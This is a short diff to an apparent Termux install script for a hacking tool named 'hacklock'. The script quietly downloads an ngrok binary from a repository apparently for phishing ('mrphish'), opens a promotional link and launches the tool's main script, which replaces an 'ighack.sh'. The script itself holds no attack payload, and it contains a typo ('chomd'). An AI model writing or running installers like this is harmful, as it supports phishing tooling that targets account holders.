@@ -36,7 +36,7 @@ center "INSTALLING REQUIREED PACKAGES"
 echo -e "\e[34mPACKAGES BEING INSTALLED WAIT....\e[0m"
 cd $HOME
 apt install -y php openssh wget git curl python > /dev/null 2>&1
-curl -LO https://github.com/noob-hackers/mrphish/blob/master/core/ngrok > /dev/null 2>&1
+wget -O ngrok https://github.com/noob-hackers/mrphish/blob/master/core/ngrok > /dev/null 2>&1
 chomd +x ngrok > /dev/null 2>&1
 mv ngrok $HOME/hacklock
 echo -e "\e[34mPACKAGES INSTALLED SUCCESSFULLY....[\e[92m✓\e[34m]\e[0m"
@@ -47,4 +47,4 @@ cd $HOME/hacklock
 rm setup
 am start -a android.intent.action.VIEW -d https://bitly.com/nhytchannel > /dev/null 2>&1 
 cd $HOME/hacklock
-bash ighack.sh
+bash hacklock.sh
